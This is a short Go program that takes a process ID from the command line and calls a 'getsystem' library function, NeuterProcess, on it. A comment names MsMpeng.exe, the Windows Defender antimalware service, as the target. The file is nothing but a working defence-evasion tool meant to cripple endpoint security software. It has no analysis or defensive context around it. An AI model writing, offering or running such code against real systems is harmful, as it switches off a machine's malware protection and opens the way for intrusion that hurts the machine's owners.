package main

import (
	"log"
	"os"
	"strconv"

	"github.com/audibleblink/getsystem"
)

func main() {
	pid, _ := strconv.Atoi(os.Args[1]) // MsMpeng.exe
	err := getsystem.NeuterProcess(pid)
	if err != nil {
		log.Fatal(err)
	}
}
